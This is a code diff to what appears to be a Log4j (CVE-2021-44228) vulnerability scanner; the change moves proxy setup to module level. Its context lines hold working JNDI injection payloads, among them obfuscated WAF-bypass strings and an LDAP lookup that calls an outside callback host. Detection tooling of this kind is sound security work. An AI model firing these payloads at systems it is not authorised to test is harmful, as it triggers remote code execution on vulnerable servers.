@@ -49,6 +49,7 @@ default_headers = {
 }
 post_data_parameters = ["username", "user", "email", "email_address", "password"]
 timeout = 4
+
 waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{callback_host}}/{{random}}}",
                        "${${::-j}ndi:rmi://{{callback_host}}/{{random}}}",
                        "${jndi:rmi://{{callback_host}}}",
@@ -111,6 +112,10 @@ parser.add_argument("--custom-dns-callback-host",
 
 args = parser.parse_args()
 
+
+proxies = {}
+if args.proxy:
+    proxies = {"http": args.proxy, "https": args.proxy}
 
 def get_fuzzing_headers(payload):
     fuzzing_headers = {}
@@ -243,7 +248,7 @@ def parse_url(url):
             "file_path": file_path})
 
 
-def scan_url(url, callback_host, proxies):
+def scan_url(url, callback_host):
     parsed_url = parse_url(url)
     random_string = ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz') for i in range(7))
     payload = '${jndi:ldap://%s.%s/%s}' % (parsed_url["host"], callback_host, random_string)
@@ -321,10 +326,7 @@ def main():
     cprint("[%] Checking for Log4j RCE CVE-2021-44228.", "magenta")
     for url in urls:
         cprint(f"[•] URL: {url}", "magenta")
-        proxies = {}
-        if args.proxy:
-            proxies = {"http": args.proxy, "https": args.proxy}
-        scan_url(url, dns_callback_host, proxies)
+        scan_url(url, dns_callback_host)
 
     if args.custom_dns_callback_host:
         cprint("[•] Payloads sent to all URLs. Custom DNS Callback host is provided, please check your logs to verify the existence of the vulnerability. Exiting.", "cyan")
